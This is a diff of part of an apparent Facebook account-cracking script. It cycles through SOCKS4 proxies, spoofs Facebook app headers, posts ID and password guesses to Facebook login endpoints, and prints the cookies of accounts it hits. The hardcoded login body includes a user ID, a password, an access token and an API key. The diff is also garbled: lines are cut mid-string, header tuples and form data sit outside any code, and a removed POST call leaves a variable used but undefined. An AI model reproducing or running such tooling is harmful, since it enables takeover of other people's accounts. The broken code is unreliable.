@@ -476,8 +476,7 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://api.facebook.com/auth/login
+			ses.headers.update('https://api.facebook.com/auth/login')
 ('User-Agent', '[FBAN/FB4A;FBAV/23.0.0.4018;FBBV/6001328;[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429651007;FBDM/{density=3.0,width=1080,height=2130};FBLC/en_US;FBRV/433511452;FBCR/MY MAXIS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX9;FBSV/8.8.8;FBOP/9;FBCA/armeabi-v7a:armeabi;]')
 ('Accept-Encoding', 'gzip, deflate')
 ('Accept', '*/*')
@@ -497,7 +496,6 @@ def crack(idf,pwv):
 ('X-FB-Server-Cluster', 'True')
 ('x-fb-connection-token', 'd29d67d37eca387482a8a5b740f84f62')
 adid=1f91fa46-9dfe-415b-9d4e-d2bf3e4bdd59&format=json&device_id=c247bf1f-015a-4239-ab38-8ea387c44266&cpl=true&family_device_id=32d3663b-1b6d-4c97-9a00-4cc685fda8db&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=device_based_login&email=100045164836473&password=778877&access_token=350685531728%257C62f8ce9f74b12f84c123cc23437a4a32&generate_session_cookies=1&meta_inf_fbmeta=&advertiser_id=890c5200-fc76-4cdc-8729-f3c69215011d&currently_logged_in_userid=0&locale=en_US&client_country_code=US&method=auth.login&fb_api_req_friendly_name=authenticate&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler&api_key=882a8490361da98702bf97a021ddc14d
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
